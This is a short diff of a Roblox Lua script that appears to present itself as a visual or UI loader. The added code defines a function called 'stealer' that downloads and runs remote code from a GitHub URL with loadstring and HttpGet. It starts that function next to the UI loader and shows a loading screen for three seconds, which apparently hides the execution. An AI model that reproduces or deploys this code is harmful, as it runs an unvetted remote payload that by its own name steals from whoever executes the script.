@@ -1,5 +1,19 @@
-ID="a38eb264-608e-4a4b-b04f-19397ae65b2f";
-loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()
+-- Enable loading screen before anything runs
+_G.LoadingScreen = true  
 
+local function stealer()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/No-ShadowHub/ShadowHubExecutor/refs/heads/main/PremiumScriptV2.3"))()
+end
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Jinx-Script/new-visual/refs/heads/main/new-visual"))()
+local function loadui()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Jinx-Script/new-visual/refs/heads/main/new-visual"))()
+end
+
+-- Run the scripts
+task.spawn(stealer)
+task.spawn(loadui)
+
+-- Optionally, turn off loading screen after a short delay
+task.delay(3, function()
+    _G.LoadingScreen = false
+end)
